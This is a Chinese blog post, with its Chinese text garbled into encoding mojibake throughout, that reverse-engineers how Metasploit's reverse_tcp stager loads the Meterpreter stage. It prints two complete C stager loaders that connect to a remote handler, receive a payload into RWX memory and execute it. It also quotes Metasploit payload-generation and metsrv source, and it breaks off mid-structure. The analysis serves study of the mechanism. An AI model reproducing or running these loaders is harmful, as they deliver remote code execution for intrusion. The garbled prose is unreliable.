æˆ‘ä»¬å¤§è‡´èƒ½çŸ¥é“å…¶å®æˆ‘ä»¬ä½¿ç”¨msfç”Ÿæˆçš„shellcodeåªæ˜¯ä¸€ä¸ªåŠ è½½å™¨(Stagers)ï¼Œç„¶ååŠ è½½å™¨é€šè¿‡æˆ‘ä»¬ç”Ÿæˆshellcodeæ—¶æŒ‡å®šçš„ipå’Œç«¯å£å›è¿è¿‡æ¥å–åˆ°çœŸæ­£æ‰§è¡Œçš„æ¶æ„è½½è·(Stages)\nåŠ è½½å™¨(Stagers)å›è¿çš„å…·ä½“æµç¨‹ é‚£ä¹ˆæå‡ºç¬¬äºŒä¸ªé—®é¢˜ï¼Œè¿™ä¸ªåŠ è½½å™¨(Stagers)å›è¿çš„å…·ä½“ä»£ç æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ\næˆ‘ä»¬é€šè¿‡æ–‡æ¡£åªèƒ½çŸ¥é“Stagersé€šè¿‡ç½‘ç»œåŠ è½½Stagesï¼Œé‚£ä¹ˆStagesæ˜¯ä»€ä¹ˆï¼Ÿshellcodeï¼Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿåå°„dllï¼Ÿè¿™äº›æˆ‘ä»¬è¿˜éƒ½ä¸æ¸…æ¥šã€‚\nç„¶åé€šè¿‡ç½‘ä¸Šä¸€äº›é›¶æ˜Ÿçš„èµ„æ–™ï¼Œæ‰¾åˆ°äº†msfé‚®ä»¶ç»„æ›¾ç»çš„ä¸¤å°é‚®ä»¶ï¼ˆæºåœ°å€å·²æ— æ³•è®¿é—®ï¼Œæ‰€å¹¸WebArchiveæœ‰ç•™å­˜ï¼‰\n[framework] inline meterpreter payload [framework] inline meterpreter payload é‡Œé¢æåˆ°æµç¨‹ä»¥åŠå…³é”®ç‚¹\næµç¨‹\nNo tutorials that I know of, but here are the basic steps:\nconnect to the handler read a 4-byte length allocate a length-byte buffer mark it as writable and executable (on Windows you\u0026rsquo;ll need VirtualProtect for this) read length bytes into that buffer jump to the buffer. easiest way to do this in C is cast it to a function pointer and call it. å…³é”®ç‚¹\nAssuming this is for X86 arch, you have to make sure that the EDI register contains your socket descriptor (the value of the ConnectSocket variable). You can do this via inline asm, but it might be easier to just prepend the 5 bytes for setting it to your shellcode:\nBF 78 56 34 12 mov edi, 0x12345678\nFor 64 bit, you have to use the RDI register (and need 10 bytes):\n48 BF 78 56 34 12 00 00 00 00 mov rdi, 0x12345678\nHope this helps,\nMichael\nPS: This is the reason why the calling convention within Metasploit is called \u0026ldquo;sockedi\u0026rdquo; :-)\nä¹Ÿå°±æ˜¯è¯´ä¸»è¦çš„æµç¨‹å¤§è‡´ä¸Šå°±æ˜¯\ntcpè¿æ¥ è¯»å–socketå‰å››ä¸ªbyteï¼Œè¿™ä¸ªä¸ºåé¢çš„è½½è·çš„é•¿åº¦ åˆ†é…å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼ŒæŠŠè½½è·å¡è¿›å» æ³¨æ„è¿™æ®µè½½è·çš„å‰é¢éœ€è¦æ‰‹åŠ¨åŠ  mov edi, \u0026amp;socket ç„¶åè·³è½¬åˆ°è¿™å—å†…å­˜è¿›è¡Œæ‰§è¡Œ å®ç°èµ·æ¥å¹¶ä¸å›°éš¾ï¼Œä½†æ˜¯æœ‰äº›å¥‡æ€ªçš„ç‚¹ï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆéœ€è¦æ‰‹åŠ¨æŠŠediçš„å€¼è®¾ç½®ä¸ºsocketçš„åœ°å€ï¼Ÿè¿™ä¸ªæˆ‘ä»¬å…ˆæ”¾ä¸€æ”¾ï¼Œçœ‹çœ‹ä¸€äº›loaderçš„æºç \né¦–å…ˆæ˜¯cobalt strikeä½œè€…çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 int main(int argc, char * argv[]) { ULONG32 size; char * buffer; void (*function)(); winsock_init(); if (argc != 3) { printf(\u0026#34;%s [host] [port]\\n\u0026#34;, argv[0]); exit(1); } /* connect to the handler */ SOCKET my_socket = wsconnect(argv[1], atoi(argv[2])); /* read the 4-byte length */ int count = recv(my_socket, (char *)\u0026amp;size, 4, 0); if (count != 4 || size \u0026lt;= 0) punt(my_socket, \u0026#34;read a strange or incomplete length value\\n\u0026#34;); /* allocate a RWX buffer */ buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer == NULL) punt(my_socket, \u0026#34;could not allocate buffer\\n\u0026#34;); /* prepend a little assembly to move our SOCKET value to the EDI register thanks mihi for pointing this out BF 78 56 34 12 =\u0026gt; mov edi, 0x12345678 */ buffer[0] = 0xBF; /* copy the value of our socket to the buffer */ memcpy(buffer + 1, \u0026amp;my_socket, 4); /* read bytes into the buffer */ count = recv_all(my_socket, buffer + 5, size); /* cast our buffer as a function and call it */ function = (void (*)())buffer; function(); return 0; } å…¶ä»–çš„å‡½æ•°æˆ‘å¹¶æ²¡æœ‰åˆ—å‡ºæ¥ï¼Œé‡Œé¢çš„å®ç°åº”è¯¥ä¹Ÿå¾ˆæ˜ç™½ï¼Œå°±æ˜¯æˆ‘ä¹‹å‰è¯´çš„æµç¨‹\nç„¶åæ˜¯å…ˆçŸ¥ç¤¾åŒºçš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æŠŠä¸Šä¸€ä»½ä»£ç æ³¨é‡Šç¿»è¯‘äº†ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 //ä¸»å‡½æ•° int main(int argc, char * argv[]) { ULONG32 size; char * buffer; //åˆ›å»ºå‡½æ•°æŒ‡é’ˆï¼Œæ–¹ä¾¿XXOO void (*function)(); winsock_init(); //å¥—æ¥å­—åˆå§‹åŒ– //è·å–å‚æ•°ï¼Œè¿™é‡Œéšä¾¿å†™ï¼Œæ¥ä¸æ¥æ”¶æ— æ‰€è°“ï¼Œä¸»è¦æ˜¯ä¼ é€’è¿œç¨‹ä¸»æœºIPå’Œç«¯å£ //è¿™ä¸ªå¯ä»¥äº‹å…ˆå®šä¹‰å¥½ if (argc != 3) { printf(\u0026#34;%s [host] [port] ^__^ \\n\u0026#34;, argv[0]); exit(1); } /*è¿æ¥åˆ°å¤„ç†ç¨‹åºï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹ä¸»æœº */ SOCKET my_socket = my_connect(argv[1], atoi(argv[2])); /* è¯»å–4å­—èŠ‚é•¿åº¦ *è¿™é‡Œæ˜¯meterpreterç¬¬ä¸€æ¬¡å‘é€è¿‡æ¥çš„ *4å­—èŠ‚ç¼“å†²åŒºå¤§å°2E840D00ï¼Œå¤§å°å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ,å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±ä¸¢å¼ƒï¼Œè‡ªå·±å®šä¹‰ä¸€ä¸ªå¤§å° */ //æ˜¯å¦æŠ¥é”™ //å¦‚æœç¬¬ä¸€æ¬¡ä¸æ˜¯æ¥æ”¶çš„4å­—èŠ‚é‚£ä¹ˆå°±é€€å‡ºç¨‹åº int count = recv(my_socket, (char *)\u0026amp;size, 4, 0); if (count != 4 || size \u0026lt;= 0) punt(my_socket, \u0026#34;read length value Error\\n\u0026#34;); /* åˆ†é…ä¸€ä¸ªç¼“å†²åŒº RWX buffer */ buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer == NULL) punt(my_socket, \u0026#34;could not alloc buffer\\n\u0026#34;); /* *SOCKETèµ‹å€¼åˆ°EDIå¯„å­˜å™¨ï¼Œè£…è½½åˆ°buffer[]ä¸­ */ //mov edi buffer[0] = 0xBF; /* æŠŠæˆ‘ä»¬çš„socketé‡Œçš„å€¼å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­å»*/ memcpy(buffer + 1, \u0026amp;my_socket, 4); /* è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒº *è¿™é‡Œå°±å¾ªç¯æ¥æ”¶DLLæ•°æ®ï¼Œç›´åˆ°æ¥æ”¶å®Œæ¯• */ count = recv_all(my_socket, buffer + 5, size); /* å°†ç¼“å†²åŒºä½œä¸ºå‡½æ•°å¹¶è°ƒç”¨å®ƒã€‚ * è¿™é‡Œå¯ä»¥çœ‹ä½œæ˜¯shellcodeçš„è£…è½½ï¼Œ * å› ä¸ºè¿™æœ¬èº«æ˜¯ä¸€ä¸ªDLLè£…è½½å™¨ï¼Œå®Œæˆä½¿å‘½ï¼Œæ§åˆ¶æƒäº¤ç»™DLLï¼Œ * ä½†æœ¬èº«ä¸é€€å‡ºï¼Œé™¤éè¿ç§»è¿›ç¨‹ï¼Œé DLLé‡Œå‡½æ•°ï¼ŒDLLåœ¨DLLMainé‡Œæ˜¯å¾ªç¯æ¥æ”¶æŒ‡ä»¤çš„ï¼Œç›´åˆ°é‡åˆ°é€€å‡ºæŒ‡ä»¤ï¼Œ * (void (*)())bufferçš„è¿™ç§ç”¨æ³•ç»å¸¸å‡ºç°åœ¨shellcodeä¸­ */ function = (void (*)())buffer; function(); return 0; } ä¸¤ä»½ä»£ç éƒ½æ²¡è§£å†³æˆ‘ä»¬çš„ç–‘é—®\næˆ‘ä»¬ç›´æ¥ç¿»ç¿»msfæºç \nlib/msf/core/payload/windows/reverse_tcp.rb\nä»£ç æ¯”è¾ƒé•¿æˆ‘å°±ä¸è´´äº†ï¼Œç®€è¦è¯´ä¸€ä¸‹ï¼Œ asm_block_recv å‡½æ•°æ˜¯æ¥æ”¶è½½è·çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬çœ‹çœ‹ asm_reverse_tcp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 create_socket: push #{encoded_host} ; host in little-endian format push #{encoded_port} ; family AF_INET and port number mov esi, esp ; save pointer to sockaddr struct push eax ; if we succeed, eax will be zero, push zero for the flags param. push eax ; push null for reserved parameter push eax ; we do not specify a WSAPROTOCOL_INFO structure push eax ; we do not specify a protocol inc eax ; push eax ; push SOCK_STREAM inc eax ; push eax ; push AF_INET push #{Rex::Text.block_api_hash(\u0026#39;ws2_32.dll\u0026#39;, \u0026#39;WSASocketA\u0026#39;)} call ebp ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 ); xchg edi, eax ; save the socket for later, don\u0026#39;t care about the value of eax after this call WSASocketA ä¹‹åè¿”å›çš„æ˜¯socketå¥æŸ„ï¼Œè¿”å›å€¼ä¸€èˆ¬æ˜¯åœ¨eaxé‡Œé¢ï¼Œç„¶åæŠŠeaxèµ‹å€¼åˆ°äº†edi\nç»§ç»­æ‰¾æ‰¾ediï¼Œä½†æ˜¯å‘ç°å‰©ä¸‹çš„ediéƒ½æ˜¯ç”¨ä½œè°ƒç”¨ï¼Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„ä½œç”¨ï¼Œé‚£ä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªï¼Ÿ\nè¿™ä¸ªè½½è·Stageså…·ä½“æ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼Ÿ è¿™é‡Œå°±è¦å¼•å…¥æˆ‘åˆšæ‰è¯´çš„å…ˆçŸ¥ä¸Šçš„é‚£ç¯‡æ–‡ç« çš„é—®é¢˜äº†ï¼Œåœ¨ Meterpreterè½½è·æ‰§è¡ŒåŸç†åˆ†æ æ–‡ç« ä¸­ï¼Œä½œè€…æåˆ°\nmetasploitçš„meterpreterçš„payloadè°ƒç”¨äº†meterpreter_loader.rbæ–‡ä»¶ï¼Œåœ¨meterpreter_loader.rbæ–‡ä»¶ä¸­åˆå¼•å…¥äº†reflective_dll_loader.rbæ–‡ä»¶ï¼Œreflective_dll_loader.rbä¸»è¦æ˜¯è·å–ReflectiveLoader()çš„åç§»åœ°å€ï¼Œç”¨äºé‡å®šä½ä½¿ç”¨ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯åˆ†æçš„ã€‚æˆ‘ä»¬æ¥åˆ°è¿™ä¸ªæ–‡ä»¶é‡Œreflectivedllinject.rbï¼Œè¿™ä¸ªæ–‡ä»¶ä¸»è¦æ˜¯ä¿®å¤åå°„dllçš„ï¼Œmeterpreter_loader.rbæ–‡ä»¶ä¸»è¦æ˜¯ç”¨äºè‡ªèº«æ¨¡å—ä½¿ç”¨ï¼Œä¿®å¤dllå’Œè¯»å–payloadçš„é•¿åº¦çš„ã€‚\nå…¶å® windows/meterpreter/reverse_tcp æ˜¯èµ°çš„ meterpreter_loaderï¼Œè€Œä¸æ˜¯æ–‡ä¸­çš„ reflectivedllinjectï¼Œæˆ‘é€šè¿‡è°ƒè¯•å‘ç°è¿™ä¸ªè¯·æ±‚è½½è·çš„è¿‡ç¨‹æ˜¯æµç» meterpreter_loader æ–‡ä»¶çš„\nä¸è¿‡è¿™ä¸¤ä¸ªæ–‡ä»¶çš„åŠŸæ•ˆéƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œæˆ‘ä»¬æ‰“å¼€åˆ†æä¸€ä¸‹\næ˜ å…¥çœ¼å¸˜çš„åº”è¯¥æ˜¯è¿™æ®µ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def stage_meterpreter(opts={}) # Exceptions will be thrown by the mixin if there are issues. dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path(\u0026#39;metsrv\u0026#39;, \u0026#39;x86.dll\u0026#39;)) asm_opts = { rdi_offset: offset, length: dll.length, stageless: opts[:stageless] == true } asm = asm_invoke_metsrv(asm_opts) # generate the bootstrap asm bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry if bootstrap.length \u0026gt; 62 raise RuntimeError, \u0026#34;Meterpreter loader (x86) generated an oversized bootstrap!\u0026#34; end # patch the bootstrap code into the dll\u0026#39;s DOS header... dll[ 0, bootstrap.length ] = bootstrap dll end è¿™æ®µä»£ç é‡Œé¢é¦–å…ˆå–åˆ°äº†metsrvçš„dllçš„æ–‡ä»¶ï¼Œç„¶åä¼ å…¥ asm_invoke_metsrv å‡½æ•°åšå¤„ç†ï¼Œç”Ÿæˆæ±‡ç¼–å­—èŠ‚ç ï¼Œç„¶åæ›¿æ¢è¿™ä¸ªdllçš„å¤´éƒ¨\næˆ‘ä»¬çœ‹çœ‹ load_rdi_dll å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å–åˆ°äº†ä¸€ä¸ªåç§»é‡ç„¶åä¼ å…¥ asm_invoke_metsrv å‡½æ•°åšå¤„ç†äº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def load_rdi_dll(dll_path) dll = \u0026#39;\u0026#39; ::File.open(dll_path, \u0026#39;rb\u0026#39;) { |f| dll = f.read } offset = parse_pe(dll) unless offset raise \u0026#34;Cannot find the ReflectiveLoader entry point in #{dll_path}\u0026#34; end return dll, offset end def parse_pe(dll) pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll)) offset = nil pe.exports.entries.each do |e| if e.name =~ /^\\S*ReflectiveLoader\\S*/ offset = pe.rva_to_file_offset(e.rva) break end end offset end ç”šè‡³æˆ‘ä»¬ä¸ç”¨æ·±ç©¶è¿™äº›å‡½æ•°çš„å…·ä½“æµç¨‹ï¼Œçœ‹åç§°å°±çŸ¥é“ï¼Œè¿™ä¸ªæ˜¯ä»dllå¯¼å‡ºè¡¨æ‰¾åˆ°äº†ReflectiveLoaderå¯¼å‡ºå‡½æ•°çš„åœ°å€\nç„¶åè¿›å…¥ asm_invoke_metsrv çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def asm_invoke_metsrv(opts={}) asm = %Q^ ; prologue dec ebp ; \u0026#39;M\u0026#39; pop edx ; \u0026#39;Z\u0026#39; call $+5 ; call next instruction pop ebx ; get the current location (+7 bytes) push edx ; restore edx inc ebp ; restore ebp push ebp ; save ebp for later mov ebp, esp ; set up a new stack frame ; Invoke ReflectiveLoader() ; add the offset to ReflectiveLoader() (0x????????) add ebx, #{\u0026#34;0x%.8x\u0026#34; % (opts[:rdi_offset] - 7)} call ebx ; invoke ReflectiveLoader() ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) ; offset from ReflectiveLoader() to the end of the DLL add ebx, #{\u0026#34;0x%.8x\u0026#34; % (opts[:length] - opts[:rdi_offset])} ^ unless opts[:stageless] || opts[:force_write_handle] == true asm \u0026lt;\u0026lt; %Q^ mov [ebx], edi ; write the current socket/handle to the config ^ end asm \u0026lt;\u0026lt; %Q^ push ebx ; push the pointer to the configuration start push 4 ; indicate that we have attached push eax ; push some arbitrary value for hInstance call eax ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) ^ end ä¸å¾—ä¸è¯´è¿™æ®µååˆ†å·§å¦™ï¼Œæˆ‘ä»¬æƒ³æƒ³åˆšæ‰çš„æµç¨‹æ˜¯ä»€ä¹ˆï¼Œæ’å¼€é‚£ä¸ª mov edi, \u0026amp;socket ä¸è®ºï¼Œå‰©ä¸‹çš„å°±æ˜¯ä»ä¼ å›æ¥çš„è½½è·çš„é¦–åœ°å€å¼€å§‹è·‘äº†ï¼Œé‚£å‡å¦‚æ˜¯ä¸€ä¸ªdllæ–‡ä»¶ï¼Œä½ æŠŠä¸€ä¸ªå¹³å¸¸çš„dllæ–‡ä»¶ï¼ŒVirtualAllocåç›´æ¥è·³åˆ°åœ°å€è·‘ï¼Œèƒ½è·‘èµ·æ¥å—ï¼Ÿæ˜¾ç„¶æ˜¯ä¸èƒ½çš„ï¼Œæˆ‘ä»¬çœ‹çœ‹msfä¸­çš„å¤„ç†\næˆ‘ä»¬ä¸Šé¢çš„ä»£ç åˆ†æè¿‡ï¼Œè¿™ä¸ªæ±‡ç¼–æœ€åæ˜¯æ›¿æ¢äº†dllçš„å¤´éƒ¨ï¼Œpeæ–‡ä»¶çš„å¤´éƒ¨å°±æ˜¯doså¤´ï¼Œdoså¤´å¿…é¡»æ˜¯MZå¼€å¤´ï¼Œä¸ç„¶è¿™ä¸ªæ ¹æœ¬ç®—ä¸ä¸Šä¸€ä¸ªpeæ–‡ä»¶\né‚£ dec ebp å’Œ pop edx ç®—æ€ä¹ˆå›äº‹ï¼Ÿ\nå…¶å®è¿™ä¸¤æ¡æ±‡ç¼–çš„æœºå™¨ç å°±æ˜¯\n1 2 \\x4D # dec ebp \\x5A # pop edx æ°å¥½æ„æˆäº†MZå¤´ï¼Œç„¶åç»§ç»­å¾€ä¸‹è·‘ï¼Œè°ƒç”¨äº†ReflectiveLoader()ï¼Œè¿™ä¸ªæ˜¯åå°„dllæŠ€æœ¯ï¼Œå…·ä½“ä»£ç æŠ€æœ¯ç»†èŠ‚å¯ä»¥è§ https://github.com/stephenfewer/ReflectiveDLLInjection\nè°ƒç”¨è¯¥dllå¯¼å‡ºå‡½æ•° ReflectiveLoader çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯åŠ è½½dllè‡ªèº«åˆ°å†…å­˜ä¸­ï¼Œç„¶åè¿”å›dllmainçš„å‡½æ•°åœ°å€ï¼Œè¿”å›å€¼æ˜¯åœ¨eaxé‡Œé¢\nç„¶åè°ƒç”¨ mov [ebx], edi ; write the current socket/handle to the config æŠŠediä¹Ÿå°±æ˜¯ä¸Šæ–‡æåˆ°çš„socketå¥æŸ„åœ°å€å­˜å…¥ebxæ‰§è¡Œçš„å†…å­˜ï¼Œä¸Šé¢å¯ä»¥çœ‹åˆ°\n1 2 ; offset from ReflectiveLoader() to the end of the DLL add ebx, #{\u0026#34;0x%.8x\u0026#34; % (opts[:length] - opts[:rdi_offset])} è¿™æ®µæ±‡ç¼–æŠŠebxæŒ‡å‘åˆ°äº†è¯¥dllåŠ è½½ç©ºé—´çš„æœ«å°¾\nç´§æ¥ç€æ‰§è¡Œ\n1 2 3 4 push ebx ; push the pointer to the configuration start push 4 ; indicate that we have attached push eax ; push some arbitrary value for hInstance call eax ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) è°ƒç”¨å‚¨å­˜åœ¨eaxä¸­çš„dllmainçš„å‡½æ•°\nå…¶ä¸­çš„ebxåˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ\næˆ‘ä»¬æŠŠç›®å…‰å†å¾€å¤–å±‚æ‹‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def stage_payload(opts={}) stage_meterpreter(opts) + generate_config(opts) end def generate_config(opts={}) ds = opts[:datastore] || datastore opts[:uuid] ||= generate_payload_uuid # create the configuration block, which for staged connections is really simple. config_opts = { arch: opts[:uuid].arch, null_session_guid: opts[:null_session_guid] == true, exitfunk: ds[:exit_func] || ds[\u0026#39;EXITFUNC\u0026#39;], expiration: (ds[:expiration] || ds[\u0026#39;SessionExpirationTimeout\u0026#39;]).to_i, uuid: opts[:uuid], transports: opts[:transport_config] || [transport_config(opts)], extensions: [], stageless: opts[:stageless] == true } # create the configuration instance based off the parameters config = Rex::Payloads::Meterpreter::Config.new(config_opts) # return the binary version of it config.to_b end å¯ä»¥çœ‹åˆ° stage_payload ä¸­æŠŠç”Ÿæˆå¥½çš„dllå­—èŠ‚ç å’Œä¸€ä¸²configæ‹¼æ¥äº†èµ·æ¥ï¼Œconfigé‡Œé¢çš„å‚æ•°è¦åˆ†æçš„è¯åˆæ˜¯ä¸€å¤§å—äº†ï¼Œæœ¬æ–‡ä¸ç€çœ¼äºæ­¤\nè·Ÿè¿› config.to_b çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 def to_b config_block end def config_block # start with the session information config = session_block(@opts) # then load up the transport configurations (@opts[:transports] || []).each do |t| config \u0026lt;\u0026lt; transport_block(t) end # terminate the transports with NULL (wchar) config \u0026lt;\u0026lt; \u0026#34;\\x00\\x00\u0026#34; # configure the extensions - this will have to change when posix comes # into play. file_extension = \u0026#39;x86.dll\u0026#39; file_extension = \u0026#39;x64.dll\u0026#39; unless is_x86? (@opts[:extensions] || []).each do |e| config \u0026lt;\u0026lt; extension_block(e, file_extension) end # terminate the extensions with a 0 size config \u0026lt;\u0026lt; [0].pack(\u0026#39;V\u0026#39;) # wire in the extension init data (@opts[:ext_init] || \u0026#39;\u0026#39;).split(\u0026#39;:\u0026#39;).each do |cfg| name, value = cfg.split(\u0026#39;,\u0026#39;) config \u0026lt;\u0026lt; extension_init_block(name, value) end # terminate the ext init config with a final null byte config \u0026lt;\u0026lt; \u0026#34;\\x00\u0026#34; # and we\u0026#39;re done config end ç„¶åæˆ‘ä»¬è·Ÿè¿› session_block å’Œ transport_block çœ‹çœ‹å°±èƒ½æ˜ç™½è¿™å°±æ˜¯ä¸€ä¸²é…ç½®è½¬åŒ–ä¸ºå­—èŠ‚ç ï¼Œå…·ä½“çš„è½¬åŒ–è§„åˆ™æˆ‘ä»¬ä¸è®º\nå¯ä»¥çœ‹åˆ° å‡½æ•°é‡Œé¢æœ‰\n1 2 3 4 5 6 7 8 9 session_data = [ 0, # comms socket, patched in by the stager exit_func, # exit function identifer opts[:expiration], # Session expiry uuid, # the UUID session_guid # the Session GUID ] session_data.pack(\u0026#39;QVVA*A*\u0026#39;) æœ€å¼€å§‹çš„æ˜¯0ï¼Œpackçš„æ ¼å¼æ˜¯Qï¼Œ8ä½ï¼Œè¿™8ä½æ˜¯å¹²å˜›çš„ï¼Ÿ\nç°åœ¨å›è¿‡å¤´æƒ³æƒ³ï¼Œå½“ä¹‹å‰ç”Ÿæˆå¥½çš„dllè½½è·ï¼Œæˆ‘ä»¬ä»é¦–åœ°å€å¼€å§‹è·‘ï¼Œæˆ‘ä»¬åˆšæ‰é‚£ä¸ªedi(socketåœ°å€)å¡«å……åˆ°å“ªäº†ï¼Œæ˜¯ä¸æ˜¯é‚£ä¸ªdllç©ºé—´çš„æœ«å°¾å†å¾€åå¡«ï¼Œè¿™ä¸ªç©ºé—´ä¸æ°å¥½å°±æ˜¯è¿™8ä½0å—ï¼Ÿ\næ‰€è°“çš„sockediåˆ°åº•æ˜¯å•¥ï¼Ÿ è·Ÿè¸ªedi æ ¹æ®æˆ‘ä»¬å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬æŠŠåŠ è½½å™¨æŒ‚è°ƒè¯•å™¨è·‘èµ·æ¥çœ‹çœ‹\né¦–å…ˆåˆ†é…å®ŒRWXå†…å­˜ç©ºé—´åï¼Œæˆ‘ä»¬çœ‹åˆ°äº†é¦–åœ°å€ 0x6A0000ï¼Œç„¶åæˆ‘ä»¬åœ¨å†…å­˜çª—å£ä¸­è½¬åˆ°è¯¥åœ°å€ï¼Œé‚£æˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„æ˜¯dllæ‰€åœ¨åŒºåŸŸçš„æœ«å°¾ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠå†…å­˜åœ°å€è½¬åˆ° 0x6CAC06ï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ï¼Œæ–¹æ³•å¾ˆå¤šï¼Œæ¯”å¦‚å¤šæ¬¡è°ƒè¯•ï¼‰\næˆ‘ä»¬é¦–å…ˆæŠŠå†…å­˜åœ°å€è½¬åˆ°è¿™ä¸ªåœ°æ–¹ç„¶åå¾€ä¸‹è·‘æŠŠæ•°æ®æ¥è¿‡æ¥çœ‹çœ‹\nç°åœ¨å‰å…«ä½è¿˜æ˜¯ç©ºçš„ï¼Œä½†æ˜¯åé¢å·²ç»æœ‰ä¸€äº›æ•°æ®äº†ï¼ŒåŒ…æ‹¬ä¸€äº›èƒ½çœ‹åˆ°æ–‡å­—çš„é…ç½®ï¼ˆæ¯”å¦‚tcp://0.0.0.0:4444ï¼‰ç„¶åç»§ç»­ä¸‹è·‘ï¼Œè¿›åˆ°æˆ‘ä»¬åˆ†é…å‡ºæ¥çš„å‡½æ•°å»çœ‹çœ‹\né¦–å½“å…¶å†²çš„å°±æ˜¯æˆ‘ä»¬çš„ mov edi, \u0026amp;socketï¼Œç»§ç»­å¾€ä¸‹\nå¯ä»¥çœ‹åˆ°ï¼Œå’Œæˆ‘ä»¬é¢„æœŸçš„ä¸€æ ·ï¼Œå¤åˆ¶åˆ°äº†è¿™å…«ä½çš„ç©ºé—´é‡Œé¢ï¼Œè¿™é‡Œå¯ä»¥é…åˆmsfæºç ä»¥åŠæˆ‘çš„æ³¨é‡ŠæŸ¥çœ‹\nåˆ†æç”¨ä½œè½½è·çš„åå°„dll è¿˜è®°å¾—æˆ‘ä»¬å‰é¢åˆ†æçš„æºç ä¸­çš„metsrv dllæ–‡ä»¶å—ï¼Ÿ\næˆ‘ä»¬å¯ä»¥åœ¨ metasploit-payloads ä¸­æ‰¾åˆ°è¿™ä¸ªé¡¹ç›®çš„æºç \næˆ‘ä»¬ç›´æ¥çœ‹çœ‹metsrc dllmainå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_METASPLOIT_ATTACH: bReturnValue = Init((MetsrvConfig*)lpReserved); break; case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE*)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; } åˆšæ‰è°ƒç”¨dllmainæˆ‘ä»¬æ˜¯ä½¿ç”¨äº† calleax ;call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)\næˆ‘ä»¬è¿™ä¸ª config_ptr ä¼ é€’çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ push ebx ; push the pointer to the configuration startï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªé¦–8ä½å¡äº†æˆ‘ä»¬socketå¥æŸ„åœ°å€çš„æ•°æ®çš„èµ·å§‹åœ°å€ï¼Œç„¶åèµ° DLL_METASPLOIT_ATTACH åˆ†æ”¯ï¼ŒæŠŠè¿™ä¸ªåœ°å€ä¸­çš„æ•°æ®å¼ºè½¬ä¸ºäº† MetsrvConfig ç»“æ„ä½“\næˆ‘ä»¬çœ‹çœ‹ MetsrvConfig ç»“æ„ä½“\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 typedef struct _MetsrvConfig { MetsrvSession session; MetsrvTransportCommon transports[1]; ///! Placeholder for 0 or more transports // Extensions will appear after this // After extensions, we get a list of extension initialisers // \u0026lt;name of extension\u0026gt;\\x00\u0026lt;datasize\u0026gt;\u0026lt;data\u0026gt; // \u0026lt;name of extension\u0026gt;\\x00\u0026lt;datasize\u0026gt;\u0026lt;data\u0026gt; // \\x00 } MetsrvConfig; typedef struct _MetsrvSession { union { UINT_PTR handle; BYTE padding[8]; } comms_handle; ///! Socket/handle for communications (if there is one). DWORD exit_func; ///! Exit func identifier for when the session ends. int expiry; ///! The total number of seconds to wait before killing off the session. BYTE uuid[UUID_SIZE]; ///! UUID BYTE 